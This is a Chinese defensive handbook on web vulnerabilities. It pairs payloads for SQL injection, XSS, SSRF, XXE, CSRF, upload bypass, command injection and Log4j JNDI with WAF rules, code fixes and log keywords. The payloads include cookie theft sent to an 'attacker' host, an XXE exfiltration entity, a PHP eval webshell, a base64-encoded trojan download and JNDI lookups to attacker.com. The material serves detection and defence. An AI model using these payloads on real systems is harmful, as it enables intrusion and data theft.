# 常见 Web 漏洞利用细节与防护

> 手册目标：从"看到特征"升级到"看得懂 payload、挡得住攻击、查得出日志"。每个漏洞给出**典型 payload + WAF/代码层防护 + 排查日志关键字**三件套，可照抄执行。

## SQL 注入各类型与检测特征

### Union 注入（联合查询）
```sql
-- 判断列数：逐步增加 order by 直到报错
' ORDER BY 1-- -
' ORDER BY 10-- -   -- 报错 Unknown column '10' => 列数 <10
-- 确认列数后回显
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,database(),user(),version(),4,5,6-- -
-- MySQL 8 报错型变体
' UNION SELECT 1,load_file('/etc/passwd'),3-- -
```
- **检测特征**：URL 参数中出现 `union select`（大小写/注释混淆：`UnIoN/**/SeLeCt`、`UNION+ALL+SELECT`）；响应中返回数据库名/版本号/错误字段数。
- **WAF 防护**：正则 `(union[\s\S]+select|order\s+by|information_schema)` 匹配；对 `-- -`、`#`、`/**/` 做归一化后再匹配。
- **代码层防护**：全部参数化查询 `prepared statement`；禁用 `multi-statements`。
- **日志关键字**：access.log 中 `union|select|information_schema|concat`；数据库错误日志 `Unknown column`、`syntax error`。

### 报错注入
```sql
-- MySQL 三件套（extractvalue / updatexml / floor）
' AND extractvalue(1,concat(0x7e,(select database()),0x7e))-- -
' AND updatexml(1,concat(0x7e,(select user()),0x7e),1)-- -
' AND (select 1 from (select count(*),concat((select version()),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
```
- **检测特征**：响应包含 `XPATH syntax error`、`Duplicate entry` 等 MySQL 报错文本；payload 含 `extractvalue|updatexml|floor(rand(`。
- **WAF 防护**：`or die(mysql_error())` 这类关闭，生产禁止把 `mysql_error()` 输出给客户端；WAF 拦截 `extractvalue|updatexml`。
- **日志关键字**：`XPATH syntax error`、`group by`、`Duplicate entry`、`floor(rand`。

### 布尔盲注
```sql
' AND 1=1-- -   -- 正常页面
' AND 1=2-- -   -- 页面异常/空
' AND (select ascii(substr(database(),1,1)))=116-- -  -- 逐字符猜
' AND (select ascii(substr((select table_name from information_schema.tables limit 0,1),1,1)))=117-- -
```
- **检测特征**：同一参数在 `1=1` 与 `1=2` 下页面差异稳定；单请求耗时/页面字节数恒定（非时间盲注）。
- **WAF 防护**：拦截 `and|or` 后跟数字比较的异常组合；对布尔条件做语义解析；开启 `sql_mode` 严格校验。
- **日志关键字**：日志里同一 IP 短时间内大量 `1=1/1=2` 请求，URL 参数含 `ascii|substr|if(`。

### 时间盲注
```sql
' AND sleep(5)-- -            -- 响应延迟 5 秒
' AND if(ascii(substr(database(),1,1))=116,sleep(5),0)-- -
-- MySQL 5/8 benchmark 变体
' AND BENCHMARK(5000000,sha1('x'))-- -
```
- **检测特征**：单请求响应时间与参数值强相关；`sleep|benchmark|waitfor delay` 关键字；大量请求 RT 稳定 +5s/+10s 呈阶梯状。
- **WAF 防护**：拦截 `sleep(|benchmark(|waitfor`；Web 层对请求总耗时设超时并熔断；数据库层限制单连接最长时间。
- **日志关键字**：access.log 中 `sleep\(|benchmark\(|waitfor`；慢查询日志 `slow_query_log` 中出现的 sleep 语句。

### 宽字节注入（GBK 编码绕过）
```php
-- 经典场景：PHP+MySQL，gbk 编码，addslashes/magic_quotes 转义单引号
%df' OR 1=1-- -   -- %df 与 \ 拼成"運"，吃掉转义反斜杠
id=%df%27 union select 1,2,3-- -
```
- **检测特征**：payload 含 `%df%27`、`%bf%27` 等 `%xx` 高位字节后紧跟 `%27`；页面编码为 GBK/GB2312。
- **WAF 防护**：先用 WAF 层把 URL 按 `utf-8` 解码后再匹配；`addslashes` 类函数已废弃，改用 `mysqli_real_escape_string` + 参数化；数据库连接设置 `SET NAMES utf8`（避免使用 gbk）。
- **日志关键字**：`%df%27`、`%bf%27`、`%5c%27`（\ 后跟单引号被转义绕过）。

### 二次注入
```sql
-- 第一次：写入时被转义但未处理语义，例如用户名注册为
username = admin' or '1'='1
-- 第二次：某功能把用户名直接拼进 SQL（未转义）
UPDATE user SET pwd='x' WHERE username='admin' or '1'='1'  -- 命中全部用户
```
- **检测特征**：单条日志看不出攻击，需要**跨请求关联**（先出现注册/写入请求，后续出现异常查询）；数据库表内容含引号/注入片段。
- **WAF 防护**：入口统一 `htmlspecialchars` + 存储层参数化；写入前过滤 `' " ; -- #` 等字符；重点审计拼接 SQL 的公共函数。
- **日志关键字**：`INSERT/UPDATE` 日志中值含单引号、`or 1=1`；后端慢查询里出现未转义的用户输入。

## XSS 存储 / 反射 / DOM 三类特征

```html
<!-- 反射型 -->
/search?kw=<script>alert(1)</script>
/search?kw="><img src=x onerror=alert(document.cookie)>
<!-- 存储型（提交后持久化，所有访问者触发） -->
<input value=""><script>fetch('//attacker/steal?c='+document.cookie)</script>
<!-- DOM 型（payload 不进服务器日志，只在前端 DOM 执行） -->
#location.hash=<img src=x onerror=alert(1)>    // 从 location.hash 取参
javascript:alert(document.domain)              // 反射点：innerHTML 直接赋值
```
- **检测特征**：反射/存储型日志含 `<script|<img onerror|onload=|<svg onload|javascript:`；DOM 型**服务器无日志**，需在浏览器 devtools 检查 `location.hash`、`innerHTML`、`document.write` 的输入点。
- **WAF 防护**：拦截 `<script|javascript:|onerror=|onload=|<svg|<iframe`；对 `< > " '` 编码为实体。
- **代码层防护**：输出编码（`htmlspecialchars($v, ENT_QUOTES)`）；Cookie 设 `HttpOnly`；CSP 头 `Content-Security-Policy: default-src 'self'`。
- **日志关键字**：`<script`、`onerror`、`document.cookie`、`<svg`、`%3Cscript%3E`（URL 编码形式）。

## SSRF 服务端请求伪造检测

```bash
# 内网探测类
curl -v "http://target/url?u=http://127.0.0.1:80/"        # 探测本机
curl -v "http://target/url?u=http://192.168.1.1:8080/"    # 探测内网网段
curl -v "http://target/url?u=http://169.254.169.254/latest/meta-data/"  # 云元数据
curl -v "http://target/url?u=http://[::1]:22/"            # IPv6 回环
# 协议转换类
file:///etc/passwd                                        # 读文件（PHP）
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...      # 打 Redis 未授权
dict://127.0.0.1:6379/info                                # dict 协议探测
```
- **检测特征**：参数名常见 `url=、urls=、link=、src=、redirect=、img=、file=、download=`；请求目标为内网 IP/云元数据 IP/`file:`/`gopher:`/`dict:` 协议。
- **WAF 防护**：白名单域名校验（`parse_url` 后比对 host）；拦截 `127.0.0.1|localhost|169.254.169.254|10\.|172.(1[6-9]|2[0-9]|3[01])\.|192\.168\.`。
- **代码层防护**：禁止向用户开放 URL 参数；必要时用代理 + 仅允许 http/https + DNS rebinding 防护（解析两次校验）。
- **日志关键字**：WAF/代理日志中目标为 `127.0.0.1`、`169.254.169.254`、`file://`、`gopher://`；访问 `/latest/meta-data/` 的请求。

## XXE 外部实体注入特征

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY xxe SYSTEM "http://attacker.com/steal?data=%file;">
]>
<user><name>&xxe;</name></user>
```
- **检测特征**：请求体为 `Content-Type: application/xml` 且含 `<!DOCTYPE|<!ENTITY`；响应回显文件内容 `/etc/passwd` 片段、`/etc/hosts`、错误中的 `file:///` 路径；Blind XXE 会向攻击者域名发起 OOB 请求。
- **WAF 防护**：拦截 `<!DOCTYPE|<!ENTITY|SYSTEM|PUBLIC`；禁止 application/xml 上传接口。
- **代码层防护**：`DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`；PHP `libxml_disable_entity_loader(true)`。
- **日志关键字**：`<!DOCTYPE`、`<!ENTITY`、`SYSTEM "file:///`；对攻击者域名的出站 DNS/HTTP 请求。

## CSRF 跨站请求伪造防护

```html
<!-- 攻击面：GET 型状态变更（如 /admin/del?id=1）最易被 img 标签触发 -->
<img src="http://target.com/admin/del?id=1">
<!-- POST 型通过自动提交表单 -->
<form action="http://target.com/admin/pwd" method="POST" hidden>
  <input name="pwd" value="hacked">
</form><script>document.forms[0].submit()</script>
```
- **检测特征**：日志中请求来自第三方 Referer（`Referer` 非本站）；无 `Origin` 头或 Origin 与 Host 不一致；敏感操作是 GET。
- **WAF 防护**：拦截状态变更接口的非本域 `Referer/Origin`；无法在 WAF 层根治，必须代码层配合。
- **代码层防护**：Token（`$_SESSION['csrf']` 随机值，表单+校验）；双重提交 Cookie（SameSite=Lax）；关键操作校验 `Origin`；`SameSite=Strict`。
- **日志关键字**：`Referer: http://attacker`、`Origin:` 与 `Host:` 不匹配的 POST。

## 文件上传绕过变体与防护

```bash
# 双扩展名 / 大小写 / 中间加空格点
shell.php.jpg        shell.jpg.php        shell.PHP        shell.phP
shell.php%00.jpg     shell.php.jpg.       shell.php. .jpg   # Windows 会丢弃尾缀空格点
# 解析漏洞配合
shell.jpg 上传到 IIS6      -> shell.jpg.asp/x 目录解析
shell.php.jpg 上传到 Nginx -> /a.php.jpg/xx.php 空字节+解析
# 图片马 + 包含触发
GIF89a<?php @eval($_POST['x']);?>   # 头部伪造 GIF89a
# .htaccess 上传使目录内 .jpg 当 php 执行
AddType application/x-httpd-php .jpg
# 条件竞争：先上传校验未完成的 php，抢在删除前访问
# 循环：cat shell.php > upload 同步 while wget http://target/uploads/shell.php
```
- **检测特征**：日志中上传文件名为双扩展/大小写混写/含 `%00`；上传后紧跟访问请求（条件竞争时间窗极短）；Content-Type 与真实内容不符（GIF89a 头）。
- **WAF 防护**：禁止 `Content-Type` 为 `image/` 的文件内容含 `<?php|<%|<?=`；扩展名白名单（仅 `jpg/png/gif/pdf`）；对 `%00`、`.php.` 归一化；文件名随机化（服务端重命名，不信任客户端文件名）。
- **代码层防护**：校验 `getimagesize()` 真图片；禁止上传目录执行脚本（Nginx 配置 `location ~* \.(php)$ { deny all; }` 于 upload 目录）；存储到独立对象存储。
- **日志关键字**：上传日志文件名含 `.php.jpg|.PHP|%00`；uploads 目录同秒级被并发访问。

## 命令注入编码绕过与防护

```bash
# 基本注入符：; | && || $() ` ` ${}
;id   |id   &&id   ||id   $(id)   `id`   ${IFS}id   %0aid
# base64 编码执行（绕过关键字匹配）
;echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
$(echo d2dldCBoYWNrZXIgaXA6cG9ydA== | base64 -d)    # 下载木马
# hex / unicode 编码
$(printf '\x63\x61\x74') /etc/passwd      # c=a t 被拆
echo $'\x63\x61\x74' /etc/passwd           # bash ANSI-C quoting
# 换行符注入（绕过一行式过滤）
\ncat /etc/passwd
%0a/usr/bin/python -c 'import os;os.system("id")'
# 无空格绕过
cat${IFS}/etc/passwd    cat%09/etc/passwd    {cat,/etc/passwd}
```
- **检测特征**：payload 含 `;|&&|$()|反引号|%0a`；含 `base64 -d|printf '\x|${IFS}`；日志里字符串与 URL 解码后出现 shell 关键字。
- **WAF 防护**：黑名单 `; | & $ ( ) ` \n` 与 shell 关键字；先 URL 解码、再 base64 解码二次检测；对 `ping`、`nslookup`、`dig` 等参数严格白名单。
- **代码层防护**：禁用 `system/exec/passthru/shell_exec/popen/proc_open`；用 `escapeshellarg`/`escapeshellcmd`；参数化调用库（如 PHP 用 `-c` 参数传 IP）。
- **日志关键字**：`base64 -d`、`printf`、`%0a`、`${IFS}`、`curl|sh`、`wget`、`/etc/passwd`。

## Log4j2 JNDI 注入利用特征（CVE-2021-44228）

```
# 核心 payload：JNDI 查找触发（由 ${} 拼接触发）
${jndi:ldap://attacker.com/a}
${jndi:ldap://attacker.com:1389/Basic/Command/Base64/Y2F0IC9ldGMvcGFzc3dk}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}${upper:d}${lower:a}${lower:p}://attacker.com}
# 常见混淆变体：env/sys/lower/upper 嵌套
${${env:ENV_NAME}}${jndi:ldap://x.dnslog.cn}
```
- **检测特征**：请求头 `User-Agent/X-Forwarded-For/Accept` 或参数中写 `${\` 前缀；`${jndi:`、`${ldap:`、`${rmi:` 关键字；日志中记录到的完整 `${...}` 字符串；配合 DNSLog 域名回连。
- **WAF 防护**：正则 `\$\{[\w.\-]*?(:?[-|\w]+)?}` 拦截所有 `${}`；对 `jndi|ldap|rmi|corba|dns` 关键字命中即拦截；请求头与 body 同时检测。
- **代码层防护**：升级 Log4j2 到 2.17.1+；临时缓解 `-Dlog4j2.formatMsgNoLookups=true`；删除 `JndiLookup.class`；禁用出站 1389/389/1099 端口。
- **日志关键字**：**关键点**——Log4j 把 payload 写入自身日志，所以排查看应用日志里是否存在 `\$\{jndi:` 原样记录；同时查 DNS/防火墙对 `dnslog.cn|interact.sh` 等域名的解析记录。

## 各漏洞通用日志排查 Checklist

- [ ] 导出被攻击前 24h 的 access.log / error.log / 数据库慢日志 / 应用日志
- [ ] 用上表"日志关键字"逐个 grep，命中即记录时间戳与 IP
- [ ] 关联同一 IP 的多个 payload（往往先探测后利用）
- [ ] 检查 `phpinfo()/whoami/database()` 回显类请求，判断是否已成功利用
- [ ] 检查 uploads 目录、/tmp、web 根目录新增文件（mtime 在攻击窗口内）
- [ ] 所有处置动作记录操作人、时间、命令，便于赛后溯源报告
